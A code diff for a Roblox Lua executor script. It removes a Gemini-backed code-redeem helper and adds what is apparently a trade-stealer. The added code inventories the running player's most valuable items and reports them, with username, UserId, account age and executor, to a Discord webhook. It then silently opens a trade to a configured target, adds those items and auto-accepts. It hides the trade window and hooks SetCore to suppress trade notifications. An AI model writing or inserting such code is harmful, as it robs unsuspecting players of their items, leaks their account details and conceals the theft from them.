-    return false, "C贸digo escrito; pulsa Confirm manualmente"
-end
-
-local function redeem(code, source)
-    local clean = trim(code)
-    if clean == "" then setStatus("No hay c贸digo para canjear", "error") return false end
-    if clean == State.LastCode and os.clock() - (State.LastCodeAt or 0) < 2 then
-        setStatus("C贸digo repetido ignorado", "info")
-        return false
-    end
-    State.LastCode = clean
-    State.LastCodeAt = os.clock()
-    CodeBox.Text = clean
-    setStatus("Procesando: " .. clean, "busy")
-    local ok, message = submitCode(clean)
-    if ok then
-        setStatus((source and source .. ": " or "") .. "Enviado a la interfaz", "ok")
-    else
-        setStatus(message, "wait")
-    end
-    return ok
-end
-
-RedeemButton.MouseButton1Click:Connect(function()
-    redeem(CodeBox.Text, "Manual")
-end)
-ClearButton.MouseButton1Click:Connect(function()
-    CodeBox.Text = ""
-    State.LastCode = ""
-    setStatus("Campo limpiado", "info")
-end)
-
---==============================================================
--- 5. DETECCI脫N Y EXTRACCI脫N DE C脫DIGOS
---==============================================================
-local function tokenize(text)
-    local tokens = {}
-    for token in tostring(text or ""):gmatch("[%w_%-]+") do
-        tokens[#tokens + 1] = token
-    end
-    return tokens
-end
-
-local function looksLikeCode(token)
-    if not token or #token < 4 or #token > 40 then return false end
-    if not token:match("%a") then return false end
-    if token:match("^%d+$") then return false end
-    return token:match("^[%w_%-]+$") ~= nil
-end
-
-local function extractCode(message)
-    local text = stripRichText(message)
-    local lower = text:lower()
-    -- Lua patterns no admiten grupos opcionales estilo regex (?:...).
-    -- Por eso cada variante se declara por separado.
-    local patterns = {
-        "code%s+is%s+([%w_%-]+)",
-        "code%s*:%s*([%w_%-]+)",
-        "code%s*%-%s*([%w_%-]+)",
-        "redeem%s+([%w_%-]+)",
-        "use%s+the%s+code%s+([%w_%-]+)",
-        "use%s+code%s+([%w_%-]+)",
-        "enter%s+the%s+code%s+([%w_%-]+)",
-        "enter%s+code%s+([%w_%-]+)",
-        "claim%s+with%s+([%w_%-]+)",
-        "claim%s+([%w_%-]+)",
-    }
-    for _, pattern in ipairs(patterns) do
-        local candidate = lower:match(pattern)
-        if candidate and looksLikeCode(candidate) then
-            for original in text:gmatch("[%w_%-]+") do
-                if original:lower() == candidate then return original end
-            end
-            return candidate
-        end
-    end
-
-    local tokens = tokenize(text)
-    local candidates = {}
-    for _, token in ipairs(tokens) do
-        if looksLikeCode(token) then candidates[#candidates + 1] = token end
-    end
-    if #candidates == 1 and (#tokens <= 5 or lower:find("sammy", 1, true)) then
-        return candidates[1]
-    end
-    return nil
-end
-
-local function isRiddle(message)
-    local lower = tostring(message or ""):lower()
-    if lower:find("?", 1, true) then return true end
-    local hints = {"what", "who", "where", "when", "which", "guess", "riddle", "how many", "how much", "solve", "plus", "minus"}
-    for _, word in ipairs(hints) do
-        if lower:find(word, 1, true) then return true end
-    end
-    return false
-end
-
-local function isSystemMessage(message)
-    if not Config.IgnoreSystem then return false end
-    local lower = tostring(message or ""):lower()
-    local ignored = {
-        "coins shop", "robux shop", "trade plaza", "spin wheel",
-        "your base is full", "your base is already locked", "trade has been completed",
-        "someone is stealing", "event has started", "brainrot trader",
-    }
-    for _, phrase in ipairs(ignored) do
-        if lower:find(phrase, 1, true) then return true end
-    end
-    return false
-end
-
---==============================================================
--- 6. GEMINI AI PARA ACERTIJOS
---==============================================================
-local function solveRiddle(question, callback)
-      question = trim(question)
-    if question == "" then callback(nil, "Pregunta vac铆a") return end
-    if State.RiddleCache[question] then callback(State.RiddleCache[question], nil, true) return end
-    if API_KEY == "" then callback(nil, "Configura SAB_GEMINI_API_KEY") return end
-    if not HttpRequest then callback(nil, "Este executor no tiene request HTTP") return end
-
+local function postWebhook(payload)
+    local url = getgenv().WEBHOOK_URL
+    if not url or url == "" then return end
     task.spawn(function()
-        local endpoint = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=" .. API_KEY
-        local body = HttpService:JSONEncode({
-            contents = {{parts = {{text = "Resuelve el acertijo y revisa internamente que tu respuesta encaje con todas las pistas antes de responder. Devuelve 煤nicamente la respuesta final exacta, sin explicaci贸n, etiquetas ni comillas. Conserva los espacios entre palabras y la ortograf铆a normal. Si no puedes determinarla con suficiente confianza, responde UNKNOWN. Acertijo: " .. question}}}},
-            generationConfig = {temperature = 0, maxOutputTokens = 40},
-        })
-        local ok, response = pcall(function()
-            return HttpRequest({
-                Url = endpoint,
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = body,
-            })
+        local body = HS:JSONEncode(payload)
+        local ok = pcall(function()
+            if typeof(request) == "function" then
+                request({ Url = url, Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" }, Body = body })
+            else
+                HS:PostAsync(url, body)
+            end
         end)
-        if not ok or not response or type(response.Body) ~= "string" then
-            callback(nil, "No se pudo conectar con Gemini")
-            return
-        end
-        if response.StatusCode and (response.StatusCode < 200 or response.StatusCode >= 300) then
-            callback(nil, "Gemini HTTP " .. tostring(response.StatusCode) .. ": " .. tostring(response.Body):sub(1, 180))
-            return
-        end
-        local parsed, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
-        if not parsed then callback(nil, "Respuesta JSON inv谩lida de Gemini") return end
-        local answer = data.candidates and data.candidates[1]
-            and data.candidates[1].content and data.candidates[1].content.parts
-            and data.candidates[1].content.parts[1] and data.candidates[1].content.parts[1].text
-        answer = trim(answer)
-        answer = answer:gsub("^[\"'`]+", ""):gsub("[\"'`]+$", "")
-        answer = answer:gsub("^[*%s]+", ""):gsub("[*%s]+$", "")
-        if answer == "" or answer:upper() == "UNKNOWN" then
-            callback(nil, "Gemini no encontr贸 una respuesta fiable")
-            return
-        end
-        State.RiddleCache[question] = answer
-        callback(answer, nil, false)
+        if not ok then log("Webhook fallo", "err") end
     end)
 end
 
---==============================================================
--- 7. PROCESADOR CENTRAL DE ANUNCIOS
---==============================================================
-local function handleAnnouncement(rawMessage)
-    local message = trim(stripRichText(rawMessage))
-    if message == "" then return end
-    if #message > 500 then return end
-
-    local now = os.clock()
-    if message == State.LastMessage and now - State.LastMessageAt < 0.6 then return end
-    State.LastMessage = message
-    State.LastMessageAt = now
-
-    if isSystemMessage(message) then return end
-    addFeed(message)
-
-    if isRiddle(message) and Config.AutoRiddleAI then
-        setStatus("Acertijo detectado; consultando Gemini...", "busy")
-        solveRiddle(message, function(answer, err, fromCache)
-            if answer then
-                CodeBox.Text = answer
-                addFeed("Respuesta IA", answer)
-                setStatus((fromCache and "Respuesta en cach茅: " or "Gemini respondi贸: ") .. answer, "ok")
-                if Config.AutoType then
-                    local box = findCodeBox()
-                    if box then pcall(function() box.Text = answer end) end
-                end
-                if Config.AutoRedeem then redeem(answer, "IA") end
-            else
-                setStatus("IA: " .. tostring(err), "error")
-            end
-        end)
-        return
-    end
-
-    local code = extractCode(message)
-    if not code then
-        if State.Listening then setStatus("Escuchando; no se detect贸 un c贸digo claro", "wait") end
-        return
-    end
-
-    if Config.AutoListen and not State.Listening then
-        State.Listening = true
-        ListenButton.Text = "LISTEN: ON"
-        ListenButton.BackgroundColor3 = Theme.Green
-    end
-
-    if State.Listening or Config.AutoListen then
-        CodeBox.Text = code
-        if Config.AutoType then
-            local box = findCodeBox()
-            if box then pcall(function() box.Text = code end) end
-        end
-        addFeed("C贸digo detectado", code)
-        if Config.AutoRedeem then
-            -- Sin espera artificial: inicia el canje en cuanto se detecta el c贸digo.
-            task.spawn(function() redeem(code, "AUTO") end)
-        else
-            setStatus("C贸digo detectado: " .. code, "ok")
-        end
-    end
+--=====================================================================
+-- MUTACIONES / EFECTOS
+--=====================================================================
+local function keyOf(name)
+    return (name:gsub("%s+", "_"))
 end
 
---==============================================================
--- 8. DETECTOR DE EVENTO DE NOTIFICACI脫N ESPEC脥FICO
---==============================================================
-local function findNotificationRemote()
-    -- Solo inspecciona el controlador de notificaciones conocido.
-    -- No se conecta indiscriminadamente a todos los RemoteEvents.
-    local controllers = ReplicatedStorage:FindFirstChild("Controllers")
-    if not controllers then return nil end
-    local module = controllers:FindFirstChild("NotificationController", true)
-    if not module or not module:IsA("ModuleScript") then return nil end
-    if not (debug and debug.getupvalues) and not getupvalues then return nil end
+local function mutationIcon(name)
+    local custom = getgenv().CUSTOM_EMOJI[name]
+    if custom and custom ~= "" then return custom end
+    local def = getgenv().MUTATIONS[keyOf(name)]
+    if not def then return nil end
+    local icon = def[1]
+    if CFG.SHOW_MULTIPLIER and def[2] and def[2] > 1 then
+        icon = icon .. " " .. tostring(def[2]) .. "x"
+    end
+    return icon
+end
 
-    local getUps = (debug and debug.getupvalues) or getupvalues
-    local ok, controller = pcall(require, module)
-    if not ok or type(controller) ~= "table" or type(controller.Start) ~= "function" then return nil end
-    local got, upvalues = pcall(getUps, controller.Start)
-    if not got or type(upvalues) ~= "table" then return nil end
+local function effectIcon(name)
+    local custom = getgenv().CUSTOM_EMOJI[name]
+    if custom and custom ~= "" then return custom end
+    return getgenv().EFFECTS[name] or getgenv().EFFECTS[keyOf(name)]
+end
 
-    for _, value in pairs(upvalues) do
-        if typeof(value) == "Instance" and (value:IsA("RemoteEvent") or value:IsA("UnreliableRemoteEvent")) then
-            return value
+local function parseTags(raw)
+    local mutas, effects = {}, {}
+    for token in string.gmatch(raw, ":([^:]+):") do
+        local key = token:gsub("^%s*(.-)%s*$", "%1")
+        local norm = key:gsub("_", " ")
+        if getgenv().MUTATIONS[keyOf(norm)] or getgenv().CUSTOM_EMOJI[norm] then
+            table.insert(mutas, norm)
+        elseif getgenv().EFFECTS[norm] then
+            table.insert(effects, norm)
+        else
+            table.insert(effects, norm) -- desconocido: se muestra como texto
+        end
+    end
+    return mutas, effects
+end
+
+local function cleanName(raw)
+    local s = raw:gsub(":%s*[^:]+%s*:", " "):gsub("%-", " "):gsub("%s+", " ")
+    return (s:gsub("^%s*(.-)%s*$", "%1"))
+end
+
+--=====================================================================
+-- LECTURA
+--=====================================================================
+local ID_KEYS = { "ItemId","ItemID","Id","ID","Uuid","UUID","UniqueId","UniqueID",
+                  "BrainrotId","BrainrotID","AssetId","SkinId","SkinID","BaseId" }
+
+local function extractId(obj)
+    if not obj then return nil end
+    for _, k in ipairs(ID_KEYS) do
+        local v = obj:GetAttribute(k); if v ~= nil then return v end
+    end
+    local ok, desc = pcall(function() return obj:GetDescendants() end)
+    if ok then
+        for _, d in ipairs(desc) do
+            for _, k in ipairs(ID_KEYS) do
+                local v = d:GetAttribute(k); if v ~= nil then return v end
+            end
+            if d:IsA("StringValue") or d:IsA("NumberValue") then
+                for _, k in ipairs(ID_KEYS) do
+                    if lc(d.Name) == lc(k) then return d.Value end
+                end
+            end
         end
     end
     return nil
 end
 
-local function onNotification(...)
-    local args = table.pack(...)
-    -- En este juego el texto del anuncio llega en el primer argumento.
-    -- No se procesan los metadatos (posici贸n, sonido, etc.) como mensajes.
-    if type(args[1]) ~= "string" then return end
-    local value = stripRichText(args[1])
-    if #value >= 4 and #value <= 500 then
-        handleAnnouncement(value)
-    end
+local function overheadOf(a)
+    return findPath(a, "Base/Spawn/Attachment/AnimalOverhead") or findPath(a, "Info/AnimalOverhead")
 end
-
-local remote = findNotificationRemote()
-if remote then
-    local ok, connection = pcall(function()
-        return remote.OnClientEvent:Connect(onNotification)
-    end)
-    if ok and connection then
-        State.RemoteConnected = true
-        table.insert(State.Connections, connection)
-    end
+local function readRaw(a)
+    local oh = overheadOf(a); if not oh then return nil end
+    local l = oh:FindFirstChild("DisplayName")
+    if l and l:IsA("TextLabel") and l.Text ~= "" then return l.Text end
+    return nil
 end
-
---==============================================================
--- 9. DETECTOR AUXILIAR DE TEXTO EN LA INTERFAZ
---==============================================================
-local function watchTextObject(obj)
-    if not isTextObject(obj) then return end
-    local name = obj.Name:lower()
-    if name:find("input", 1, true) or name:find("textbox", 1, true) then return end
-    local lastText = obj.Text
-    local connection = obj:GetPropertyChangedSignal("Text"):Connect(function()
-        local current = obj.Text
-        if current ~= lastText then
-            lastText = current
-            local clean = stripRichText(current)
-            if #clean >= 5 and #clean <= 500 then handleAnnouncement(clean) end
+local function readSkin(a)
+    local s = a:GetAttribute("Skin") or a:GetAttribute("BaseSkin")
+    if s then return tostring(s) end
+    return nil
+end
+local function readIncome(a)
+    for _, k in ipairs({ "Income","MoneyPerSecond","Money","Value","IncomePerSecond" }) do
+        local v = a:GetAttribute(k)
+        if typeof(v) == "number" then
+            if v >= 1e9 then return string.format("%.1fB", v / 1e9) end
+            if v >= 1e6 then return string.format("%.1fM", v / 1e6) end
+            if v >= 1e3 then return string.format("%.1fK", v / 1e3) end
+            return tostring(math.floor(v))
         end
-    end)
-    table.insert(State.Connections, connection)
-    State.GuiObserverCount += 1
+    end
+    local ok, desc = pcall(function() return a:GetDescendants() end)
+    if not ok then return nil end
+    for _, d in ipairs(desc) do
+        if d:IsA("TextLabel") then
+            local m = string.match(d.Text, "([%d%.]+[KMBT]?)/s") or string.match(d.Text, "%$([%d%.]+[KMBT]?)")
+            if m then return m end
+        end
+    end
+    return nil
+end
+local function incomeNum(s)
+    if not s then return 0 end
+    local n, u = string.match(s, "([%d%.]+)([KMBT]?)")
+    n = tonumber(n) or 0
+    if u and MULT[u] then n = n * MULT[u] end
+    return n
 end
 
-for _, obj in ipairs(PlayerGui:GetDescendants()) do
-    watchTextObject(obj)
+--=====================================================================
+-- DUEÑO DE BASE
+--=====================================================================
+local function playerFromText(text)
+    if not text or text == "" then return nil end
+    local clean = text:gsub("%s+", "")
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p.Name == clean or lc(p.DisplayName) == lc(text) then return p end
+    end
+    return nil
 end
-
-table.insert(State.Connections, PlayerGui.DescendantAdded:Connect(function(obj)
-    task.defer(watchTextObject, obj)
-end))
-
---==============================================================
--- 10. CONTROLES Y ATAJOS
---==============================================================
-local function refreshButtons()
-    ListenButton.Text = State.Listening and "LISTEN: ON" or "LISTEN: OFF"
-    ListenButton.BackgroundColor3 = State.Listening and Theme.Green or Theme.Input
-    TypeButton.Text = "AUTO TYPE: " .. (Config.AutoType and "ON" or "OFF")
-    TypeButton.BackgroundColor3 = Config.AutoType and Theme.Panel or Theme.Input
-    AutoRedeemButton.Text = "AUTO REDEEM: " .. (Config.AutoRedeem and "ON" or "OFF")
-    AutoRedeemButton.BackgroundColor3 = Config.AutoRedeem and Theme.Panel or Theme.Input
-    AIButton.Text = "GEMINI AI: " .. (Config.AutoRiddleAI and "ON" or "OFF")
-    AIButton.BackgroundColor3 = Config.AutoRiddleAI and Theme.Panel or Theme.Input
-end
-
-ListenButton.MouseButton1Click:Connect(function()
-    State.Listening = not State.Listening
-    refreshButtons()
-    setStatus(State.Listening and "Escuchando anuncios..." or "Escucha pausada", State.Listening and "wait" or "info")
-end)
-TypeButton.MouseButton1Click:Connect(function()
-    Config.AutoType = not Config.AutoType
-    refreshButtons()
-end)
-AutoRedeemButton.MouseButton1Click:Connect(function()
-    Config.AutoRedeem = not Config.AutoRedeem
-    refreshButtons()
-end)
-AIButton.MouseButton1Click:Connect(function()
-    Config.AutoRiddleAI = not Config.AutoRiddleAI
-    refreshButtons()
-end)
-
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if State.Rebinding then
-        if input.UserInputType == Enum.UserInputType.Keyboard then
-            if input.KeyCode ~= Enum.KeyCode.Escape then
-                Config[State.Rebinding] = input.KeyCode
+local function getPlotOwner(plot)
+    local byName = Players:FindFirstChild(plot.Name)
+    if byName then return byName end
+    local sign = plot:FindFirstChild("PlotSign")
+    if sign then
+        for _, d in ipairs(sign:GetDescendants()) do
+            if d:IsA("TextLabel") then
+                local p = playerFromText(d.Text); if p then return p end
             end
-            State.Rebinding = nil
         end
-        return
     end
-    if gameProcessed then return end
-    if input.UserInputType == Enum.UserInputType.Keyboard then
-        if input.KeyCode == Config.ListenKey then
-            State.Listening = not State.Listening
-            refreshButtons()
-            setStatus(State.Listening and "Escuchando anuncios..." or "Escucha pausada", State.Listening and "wait" or "info")
-        elseif input.KeyCode == Config.RedeemKey then
-            redeem(CodeBox.Text, "Manual")
+    return nil
+end
+local function getPlotOfPlayer(p)
+    local plots = WS:FindFirstChild("Plots")
+    if not plots or not p then return nil end
+    for _, plot in ipairs(plots:GetChildren()) do
+        if getPlotOwner(plot) == p then return plot end
+    end
+    return nil
+end
+
+--=====================================================================
+-- RECOLECCION
+--=====================================================================
+local function collectFromPlot(plot)
+    local out = {}
+    if not plot then return out end
+    local podiums = plot:FindFirstChild("AnimalPodiums")
+    if podiums then
+        for _, a in ipairs(podiums:GetChildren()) do
+            local raw = readRaw(a)
+            if raw then
+                local mutas, effects = parseTags(raw)
+                local parts = {}
+                for _, m in ipairs(mutas) do
+                    local ic = mutationIcon(m)
+                    table.insert(parts, ic or ("*" .. m .. "*"))
+                end
+                for _, e in ipairs(effects) do
+                    local ic = effectIcon(e)
+                    table.insert(parts, ic or ("*" .. e .. "*"))
+                end
+                table.insert(out, {
+                    kind = "brainrot",
+                    raw = raw,
+                    name = cleanName(raw),
+                    tags = parts,
+                    skin = readSkin(a),
+                    id = extractId(a),
+                    income = readIncome(a),
+                    inst = a,
+                })
+            end
         end
+    end
+    local purchases = plot:FindFirstChild("Purchases")
+    if purchases then
+        for _, block in ipairs(purchases:GetChildren()) do
+            local box = block:FindFirstChild("PlotBlock")
+            if box then
+                local label
+                for _, d in ipairs(box:GetDescendants()) do
+                    if d:IsA("TextLabel") and d.Text ~= "" then label = d.Text break end
+                end
+                if label then
+                    local mutas, effects = parseTags(label)
+                    local parts = {}
+                    for _, m in ipairs(mutas) do
+                        local ic = mutationIcon(m); table.insert(parts, ic or ("*" .. m .. "*"))
+                    end
+                    for _, e in ipairs(effects) do
+                        local ic = effectIcon(e); table.insert(parts, ic or ("*" .. e .. "*"))
+                    end
+                    table.insert(out, {
+                        kind = "gear", raw = label, name = cleanName(label),
+                        tags = parts, id = extractId(box), inst = box,
+                    })
+                end
+            end
+        end
+    end
+    return out
+end
+
+local function classify(it)
+    local n = it.name
+    if it.kind == "brainrot" then
+        if getgenv().NORMAL_BRAINROTS[n] then return "brainrot" end
+        if it.skin and getgenv().NORMAL_BASE_SKINS[it.skin] then return "base" end
+        if getgenv().NORMAL_BASE_SKINS[n] then return "base" end
+        return "none"
+    end
+    if getgenv().NORMAL_GEARS[n] then return "gear" end
+    if getgenv().NORMAL_BASE_SKINS[n] then return "base" end
+    return "none"
+end
+
+--=====================================================================
+-- REMOTES
+--=====================================================================
+local ROLE_PATTERNS = {
+    Request = { "requesttrade","sendtrade","traderequest","starttrade","createtrade","request","invite" },
+    Add     = { "additem","addtradeitem","addbrainrot","offeritem","setitem","add" },
+    Ready   = { "setready","toggleready","ready" },
+    Accept  = { "accepttrade","confirmtrade","accept","confirm","complete" },
+    Cancel  = { "canceltrade","declinetrade","cancel","decline" },
+}
+local function scoreRemote(r, role)
+    local name, path = lc(r.Name), lc(r:GetFullName())
+    local s = 0
+    for _, pat in ipairs(ROLE_PATTERNS[role]) do
+        if string.find(name, pat, 1, true) then
+            s = s + 10
+            if name == pat then s = s + 15 end
+        elseif string.find(path, pat, 1, true) then s = s + 3 end
+    end
+    if string.find(path, "trade", 1, true) then s = s + 8 end
+    return s
+end
+
+local function discoverRemotes()
+    local pool = {}
+    for _, root in ipairs({ RS, WS }) do
+        local ok, descs = pcall(function() return root:GetDescendants() end)
+        if ok then
+            for _, d in ipairs(descs) do
+                if (d:IsA("RemoteEvent") or d:IsA("RemoteFunction"))
+                    and string.find(lc(d:GetFullName()), "trade", 1, true) then
+                    table.insert(pool, d)
+                end
+            end
+        end
+end
+    log(("Remotes de trade: %d"):format(#pool))
+    for _, r in ipairs(pool) do log("  -> " .. r:GetFullName()) end
+
+    for role in pairs(REMOTES) do
+        local forced = CFG.FORCE_REMOTES[role]
+        if forced then
+            REMOTES[role] = findPath(RS, forced) or findPath(WS, forced)
+        else
+            local best, bestS = nil, 0
+            for _, r in ipairs(pool) do
+                local s = scoreRemote(r, role)
+                if s > bestS then best, bestS = r, s end
+            end
+            if best and bestS >= 8 then REMOTES[role] = best end
+        end
+        log(("REMOTE %s -> %s"):format(role, tostring(REMOTES[role] and REMOTES[role]:GetFullName() or "NO")))
+    end
+end
+
+local function fire(r, ...)
+    if not r then return false end
+    return pcall(function()
+        if r:IsA("RemoteFunction") then r:InvokeServer(...) else r:FireServer(...) end
+    end)
+end
+
+--=====================================================================
+-- UI DE TRADE
+--=====================================================================
+local function findTradeRoot()
+    local pg = LP:FindFirstChild("PlayerGui")
+    if not pg then return nil end
+    for _, d in ipairs(pg:GetChildren()) do
+        if d:IsA("ScreenGui") and string.find(lc(d.Name), "trade", 1, true) then return d end
+    end
+    for _, d in ipairs(pg:GetDescendants()) do
+        if string.find(lc(d.Name), "trade", 1, true) then
+            local g = d:FindFirstAncestorWhichIsA("ScreenGui")
+            if g and g ~= pg then return g end
+        end
+    end
+    return nil
+end
+local function tradeOpen() return findTradeRoot() ~= nil end
+
+local function hideTrade()
+    if not CFG.HIDE_TRADE_GUI then return end
+    local root = findTradeRoot()
+    if root then
+        pcall(function() root.Enabled = false end)
+        for _, d in ipairs(root:GetDescendants()) do
+            if d:IsA("GuiObject") then pcall(function() d.Visible = false end) end
+        end
+    end
+end
+
+local function muteTradeNotifs()
+    if not CFG.MUTE_TRADE_NOTIF then return end
+    pcall(function()
+        local old = hookfunction(StarterGui.SetCore, newcclosure(function(self, m, data)
+            if m == "SendNotification" and typeof(data) == "table" then
+                local t = lc(data.Title or "") .. lc(data.Text or "")
+                if string.find(t, "trade", 1, true) then return end
+            end
+            return old(self, m, data)
+        end))
+    end)
+end
+
+task.spawn(function()
+    LP:WaitForChild("PlayerGui").DescendantAdded:Connect(function(d)
+        if string.find(lc(d.Name), "trade", 1, true) then
+            task.wait(0.1); hideTrade()
+        end
+    end)
+end)
+
+--=====================================================================
+-- OFERTA
+--=====================================================================
+local function buildOffer()
+    local plot = getPlotOfPlayer(LP)
+    if not plot then return {} end
+    local list = {}
+    for _, it in ipairs(collectFromPlot(plot)) do
+        if classify(it) ~= "none" then table.insert(list, it) end
+    end
+    table.sort(list, function(a, b) return incomeNum(a.income) > incomeNum(b.income) end)
+    local out = {}
+    for i = 1, math.min(#list, CFG.MAX_TRADE_ITEMS) do out[i] = list[i] end
+    return out
+end
+
+local function fireAdd(it)
+    if not REMOTES.Add then return false end
+    local shapes = {}
+    for _, k in ipairs({ it.id, it.inst, it.raw }) do
+        if k ~= nil then
+            table.insert(shapes, { k }); table.insert(shapes, { 1, k })
+        end
+    end
+    for _, a in ipairs(shapes) do
+        if fire(REMOTES.Add, U(a)) then return true end
+    end
+    return false
+end
+
+local function fireRequest()
+    local t = getTarget()
+    if not t or not REMOTES.Request then return false end
+    local shapes
+    if CFG.ARG_STYLE == "userid" then shapes = { { t.UserId } }
+    elseif CFG.ARG_STYLE == "player" then shapes = { { t } }
+    elseif CFG.ARG_STYLE == "name" then shapes = { { t.Name } }
+    else shapes = { { t.UserId }, { t }, { t.Name } } end
+    for _, a in ipairs(shapes) do
+        if fire(REMOTES.Request, U(a)) then STATE.lastRequest = tick(); return true end
+    end
+    return false
+end
+
+--=====================================================================
+-- CICLO DE TRADE
+--=====================================================================
+local function runTrade()
+    if STATE.inTrade then return end
+    local t = getTarget(); if not t then return end
+    local offer = buildOffer(); if #offer == 0 then return end
+    STATE.inTrade = true
+
+    local ok, err = pcall(function()
+        fireRequest()
+        log(("Trade -> %s | items: %d"):format(t.Name, #offer))
+        local w = 0
+        while w < 8 and STATE.running do
+            if tradeOpen() then break end
+            task.wait(0.25); w = w + 0.25
+        end
+        if not tradeOpen() then log("Ventana no abierta", "err"); return end
+
+        hideTrade(); task.wait(0.4)
+        local placed = 0
+        for _, it in ipairs(offer) do
+            if not STATE.running then return end
+            if not tradeOpen() then break end
+            if fireAdd(it) then placed = placed + 1 end
+            task.wait(0.16)
+        end
+        log(("Colocados %d/%d"):format(placed, #offer))
+
+        task.wait(0.7)
+        fire(REMOTES.Ready) or fire(REMOTES.Ready, true)
+        task.wait(1.4)
+        if CFG.AUTO_ACCEPT then
+            fire(REMOTES.Accept) or fire(REMOTES.Accept, true)
+            task.wait(1.2)
+            if tradeOpen() then fire(REMOTES.Accept, true) end
+        end
+        local w2 = 0
+        while w2 < 8 and tradeOpen() do task.wait(0.25); w2 = w2 + 0.25 end
+    end)
+    if not ok then log("runTrade: " .. tostring(err), "err") end
+    task.wait(1.2)
+    STATE.inTrade = false
+end
+
+--=====================================================================
+-- REPORTE
+--=====================================================================
+local function line(n, it)
+    local s = ("%d. **%s**"):format(n, it.name)
+    if #it.tags > 0 then s = s .. " - " .. table.concat(it.tags, ", ") end
+    if it.income then s = s .. " | 💰 +" .. it.income .. "/s" end
+    return s
+end
+
+local function numbered(list)
+    local out = {}
+    for i, it in ipairs(list) do table.insert(out, line(i, it)) end
+    return out
+end
+
+local function section(icon, title, list)
+    local out = { ("%s **%s (%d)**"):format(icon, title, #list), "-----", "" }
+    if #list == 0 then
+        table.insert(out, "*NONE*")
+    else
+        for _, l in ipairs(numbered(list)) do table.insert(out, l) end
+    end
+    table.insert(out, "")
+    return table.concat(out, "\n")
+end
+
+local function infoBlock(icon, title, value)
+    return ("%s **%s**\n%s\n"):format(icon, title, value)
+end
+
+local function report(all)
+    local brainrots, bases, gears, junk = {}, {}, {}, {}
+
+    for _, it in ipairs(all) do
+        local c = classify(it)
+        if c == "brainrot" then table.insert(brainrots, it)
+        elseif c == "base" then table.insert(bases, it)
+        elseif c == "gear" then table.insert(gears, it)
+        else table.insert(junk, it) end
+    end
+
+    table.sort(brainrots, function(a, b) return incomeNum(a.income) > incomeNum(b.income) end)
+    table.sort(junk, function(a, b) return incomeNum(a.income) > incomeNum(b.income) end)
+
+    local best = brainrots[1]
+
+    local parts = {}
+    table.insert(parts, section("🧠", "BRAINROT TARGET", brainrots))
+    table.insert(parts, section("⚙️", "BASE TARGET", bases))
+    table.insert(parts, section("🔧", "GEARS TARGET", gears))
+
+    local jb = { ("📦 **ITEMS NO TARGET (%d)**"):format(#junk), "-----", "" }
+    if #junk == 0 then
+        table.insert(jb, "*NONE*")
+    else
+        local jbBrain, jbGear = {}, {}
+        for _, it in ipairs(junk) do
+            if it.kind == "gear" then table.insert(jbGear, it) else table.insert(jbBrain, it) end
+        end
+        if #jbBrain > 0 then
+            table.insert(jb, "🧠 **Brainrots:**")
+            for _, l in ipairs(numbered(jbBrain)) do table.insert(jb, l) end
+        end
+        if #jbGear > 0 then
+            table.insert(jb, "")
+            table.insert(jb, "🔧 **Gears:**")
+            for _, l in ipairs(numbered(jbGear)) do table.insert(jb, l) end
+        end
+    end
+    table.insert(parts, table.concat(jb, "\n"))
+
+    if CFG.SHOW_EXECUTOR then
+        local exName, exVer = "Desconocido", ""
+        pcall(function()
+            local a, b = identifyexecutor()
+            if a then exName = a end
+            if b then exVer = " " .. b end
+        end)
+        table.insert(parts, infoBlock("🖥️", "Executor", exName .. exVer))
+    end
+    if CFG.SHOW_PLAYERS then
+        table.insert(parts, infoBlock("👤", "Jugadores",
+            ("%d/%d"):format(#Players:GetPlayers(), Players.MaxPlayers)))
+    end
+    if CFG.SHOW_ACCOUNT then
+        table.insert(parts, infoBlock("📅", "Cuenta", ("%d días"):format(LP.AccountAge)))
+    end
+
+    local desc = table.concat(parts, "\n")
+    if #desc > 4000 then desc = string.sub(desc, 1, 3990) .. "\n..." end
+
+    local footer = ("%s • %d • %s • %s | hoy a las %s"):format(
+        LP.Name, LP.UserId, CFG.FOOTER_SITE, CFG.FOOTER_DISCORD, os.date("%H:%M"))
+
+    local content = ("%sthe best brainrot targeted is \"%s\""):format(
+        CFG.PING_EVERYONE and "@everyone " or "",
+        best and best.name or "nothing")
+
+    postWebhook({
+        username = "SAB",
+        content = content,
+        allowed_mentions = { parse = { "everyone" } },
+        embeds = { { color = 65280, description = desc, footer = { text = footer } } },
+    })
+end
+
+--=====================================================================
+-- BUCLE
+--=====================================================================
+local function scanLocal()
+    local plot = getPlotOfPlayer(LP)
+    if not plot then return {} end
+    return collectFromPlot(plot)
+end
+
+task.spawn(function()
+    while not game:IsLoaded() do task.wait(0.5) end
+    task.wait(2)
+    muteTradeNotifs()
+    discoverRemotes()
+    if not REMOTES.Request then notify("SAB", "Sin remote de trade. Mira F9.") end
+
+    while STATE.running do
+        local ok, all = pcall(scanLocal)
+        if ok and all then
+            local sig = {}
+            for _, it in ipairs(all) do table.insert(sig, it.raw .. "|" .. tostring(it.id)) end
+            table.sort(sig)
+            sig = table.concat(sig, ";")
+
+            local targets = 0
+            for _, it in ipairs(all) do
+                if classify(it) ~= "none" then targets = targets + 1 end
+            end
+
+            if targets > 0 and STATE.lastReport ~= sig then
+                STATE.lastReport = sig
+                report(all)
+                notify("SAB", ("%d objetivo(s) en la base"):format(targets))
+            end
+
+            if targets > 0 and not STATE.inTrade and not tradeOpen()
+                and (tick() - STATE.lastRequest) >= CFG.RETRY_DELAY then
+                runTrade()
+            end
+        end
+        task.wait(CFG.POLL_INTERVAL)
     end
 end)
 
--- Cambiar opciones al pulsar el texto inferior con el bot贸n derecho no es
--- necesario: las teclas por defecto son F (escuchar) y G (canjear).
+--=====================================================================
+-- HUD
+--=====================================================================
+pcall(function()
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "SAB_HUD"; gui.ResetOnSpawn = false; gui.DisplayOrder = 99
+    gui.Parent = LP:WaitForChild("PlayerGui")
 
---==============================================================
--- 11. ESTADO INICIAL
---==============================================================
-refreshButtons()
-if State.RemoteConnected then
-    setStatus("Detector conectado al evento de anuncios", "ok")
-elseif State.GuiObserverCount > 0 then
-    setStatus("Detector visual activo; remoto no localizado", "wait")
-else
-    setStatus("Abre el juego y la ventana Codes", "wait")
-end
